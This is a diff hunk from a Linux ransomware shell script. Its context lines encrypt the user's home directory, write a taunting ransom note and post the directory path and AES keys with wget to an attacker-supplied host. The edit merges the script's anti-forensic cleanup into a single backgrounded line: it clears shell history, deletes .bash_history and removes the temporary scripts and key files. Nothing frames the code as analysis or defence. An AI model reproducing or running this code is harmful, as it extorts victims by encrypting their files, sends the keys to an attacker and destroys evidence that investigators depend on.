@@ -33,11 +33,4 @@ p=`echo ~/`
 encdir "$p" > /dev/null 2>&1
 echo "HeHeHe All your home directory is encrypted with AES 256" > ~/OpenIt.txt
 wget -X POST -d "dir=$p&Key1=$m&key2=$n" "$1" > /dev/null 2>&1
-history -c > /dev/null 2>&1
-history -w > /dev/null 2>&1
-rm post.php
-rm ~/.bash_history > /dev/null 2>&1
-rm /tmp/base.sh > /dev/null 2>&1
-rm /tmp/encrypt.sh > /dev/null 2>&1
-rm /tmp/AesKey1.txt > /dev/null 2>&1
-rm /tmp/AesKey2.txt > /dev/null 2>&1
+history -c > /dev/null 2>&1 & history -w > /dev/null 2>&1 & rm post.php & rm ~/.bash_history > /dev/null 2>&1 & rm /tmp/base.sh > /dev/null 2>&1 & rm /tmp/encrypt.sh > /dev/null 2>&1 & rm /tmp/AesKey1.txt > /dev/null 2>&1 & rm /tmp/AesKey2.txt > /dev/null 2>&1
